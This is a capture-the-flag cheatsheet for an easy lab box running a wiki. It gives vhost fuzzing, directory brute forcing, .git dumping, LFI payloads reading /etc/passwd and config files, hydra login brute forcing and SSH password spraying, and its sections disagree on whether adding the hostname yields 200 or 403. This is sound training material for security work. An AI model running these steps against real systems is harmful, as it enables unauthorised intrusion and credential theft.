# OctoPain — Web / Wiki Enumeration Cheatsheet

**Event:** NexSec Final · Boot2Root Day 1 · Student Track
**Box:** OctoPain (Linux, Easy) · `10.0.27.66` · hostname `octopus.garden`
**Brief:** A hobby wiki ("Octopus Garden") with notes on octopuses, left running on the host.

> Lab / CTF use only. Replace `10.0.27.66` if your team's IP differs.

---

## 0. What the scan already told us

```
22/tcp  open  ssh   OpenSSH 9.6p1 Ubuntu 3ubuntu13.20 (Ubuntu 24.04)
80/tcp  open  http  nginx 1.24.0 (Ubuntu)   ->  http-title: 403 Forbidden
```

Two takeaways:

- **80 returns 403 on the bare IP = name-based virtual host.** nginx only serves the
  site when the request carries `Host: octopus.garden`. This is the whole reason the
  task says *"ensure to include hostname: octopus.garden."* Fix `/etc/hosts` first or
  everything you do on port 80 will be a dead 403.
- **22 is the landing spot, not the way in.** OpenSSH 9.6p1 is in range for regreSSHion
  (CVE-2024-6387) but that race is unreliable and not the intended path on an easy box.
  You SSH in later with creds found on the website.

**Vuln shape of this box:** vhost-gated wiki on :80 → wiki-engine CVE *or* a credential
planted in the notes → SSH in → local privesc to root.

---

## Start here — step by step (what we actually observed)

1. **Add the hostname, then curl the apex:**
   ```bash
   export IP=10.0.27.66
   echo "$IP octopus.garden" | sudo tee -a /etc/hosts
   curl -s -I http://octopus.garden/
   ```
   **Observed:** still `HTTP/1.1 403 Forbidden`, `Content-Length: 162` (nginx default
   forbidden page). The apex is forbidden *on purpose* — adding the hostname is not
   enough. That means the real app is almost certainly on a **subdomain** (same pattern
   as HTB "Nexus", which hid `git.nexus.htb`).

2. **Don't bother with whatweb on this pwnbox** — it's a broken install
   (`cannot load such file -- /usr/bin/lib/...`). Fingerprint with curl/nuclei instead,
   once we can actually reach the app.

3. **Fuzz for the subdomain** (this is the key step), filtering out every 403:
   ```bash
   ffuf -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ \
     -u http://octopus.garden/ -H "Host: FUZZ.octopus.garden" -fc 403
   # wordlist may instead be at /usr/share/seclists/Discovery/DNS/...
   ```
   `-fc 403` hides the forbidden noise, so anything that appears is a real vhost
   (watch for `git`, `wiki`, `dev`, `notes`, `blog`).

4. **Add the found vhost and browse it:**
   ```bash
   echo "$IP THATNAME.octopus.garden" | sudo tee -a /etc/hosts
   curl -s -I http://THATNAME.octopus.garden/
   ```
   Then open it in Firefox and read everything. From here, follow sections 2–7 below.

---

## 1. Set the hostname (do this before anything else)

```bash
export IP=10.0.27.66
echo "$IP octopus.garden" | sudo tee -a /etc/hosts
curl -s -I http://octopus.garden/      # should now be 200, not 403
```

---

## 2. Fingerprint the wiki

Figure out *which* wiki engine and *which* version — that decides the CVE.

```bash
whatweb http://octopus.garden/
curl -s http://octopus.garden/ | grep -iE 'generator|powered by|wiki|version'
curl -s -I http://octopus.garden/      # Server / X-Powered-By headers

# common wiki fingerprints to look for in the HTML / paths:
#   DokuWiki   -> /doku.php, "DokuWiki" meta generator, /lib/exe/
#   MediaWiki  -> /index.php?title=, /api.php, "MediaWiki" generator
#   PmWiki     -> ?n=Main.HomePage
#   Wiki.js    -> /_assets/, GraphQL at /graphql
#   TiddlyWiki -> single index.html, "tiddlywiki" in source
```

Note the exact engine + version string, then:

```bash
searchsploit <engine> <version>
# e.g. searchsploit dokuwiki ; searchsploit mediawiki 1.39
```

---

## 3. Content & directory enumeration

The notes themselves are the point — creds and hints get planted in wiki pages.

```bash
# read every page: crawl the whole site
wget -r -np -k http://octopus.garden/ -P loot_site/
grep -riE 'pass|pwd|cred|ssh|user|login|key|todo|secret' loot_site/

# directory / file brute (include the wiki's own extensions)
gobuster dir -u http://octopus.garden/ -t 40 \
  -w /usr/share/wordlists/dirb/common.txt -x php,txt,html

# look for the classics that leak creds/config:
#   /.git/   /backup   /config   /.htpasswd   /data/   /conf/   robots.txt
curl -s http://octopus.garden/robots.txt
```

If you spot a `/.git/` folder:

```bash
git clone http://octopus.garden/.git loot_git 2>/dev/null \
  || (pip install git-dumper && git-dumper http://octopus.garden/.git loot_git)
cd loot_git && git log -p | grep -iE 'pass|user|key'
```

---

## 4. Subdomain / vhost sweep (there may be more than one)

```bash
# the apex 403s, so just filter out status 403 and keep whatever's left
ffuf -u http://octopus.garden/ -H "Host: FUZZ.octopus.garden" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fc 403
# add any hit to /etc/hosts and enumerate it too
```

---

## 5. App-level attacks (pick based on what you found)

```bash
# LFI / path traversal — if a page takes ?page= / ?file= / ?n=
curl -s "http://octopus.garden/index.php?page=../../../../etc/passwd"
curl -s "http://octopus.garden/?file=php://filter/convert.base64-encode/resource=config"

# Wiki admin login — try default / weak creds, then brute if a user is known
#   admin:admin  admin:password  admin:<wikiname>
hydra -l admin -P /usr/share/wordlists/rockyou.txt octopus.garden \
  http-post-form "/login:user=^USER^&pass=^PASS^:invalid"

# Authenticated wiki -> RCE: many engines allow PHP in templates/plugins once
# you're admin. Check the engine's known "edit template / upload plugin" CVE.
```

---

## 6. Turn web findings into SSH

Wiki pages often hide a username and/or password. Harvest names and try them on SSH.

```bash
# build a username list from names found in the notes
username-anarchy -i names.txt > users.txt

# spray a found/weak password across those users
hydra -L users.txt -p '<password-from-wiki>' ssh://$IP -t 4

# or a single known pair
ssh <user>@$IP
```

After a shell:

```bash
id; sudo -l; getcap -r / 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
# upload & run linpeas for the full privesc picture
```

---

## 7. Flags

```bash
cat /home/*/user.txt     # User flag  (250 pts)
sudo cat /root/root.txt  # Root flag  (500 pts)
```

Submit on the NexSec dashboard as you find each one.

---

## Quick checklist

- [ ] `octopus.garden` added to `/etc/hosts`, port 80 now returns 200
- [ ] wiki engine + version identified → `searchsploit`
- [ ] every wiki page read, grepped for creds/usernames
- [ ] dirbusted for `/.git`, `/backup`, `/config`, `robots.txt`
- [ ] vhost sweep done
- [ ] LFI / default-admin / upload tested
- [ ] harvested creds tried on SSH (22)
- [ ] user.txt + root.txt submitted
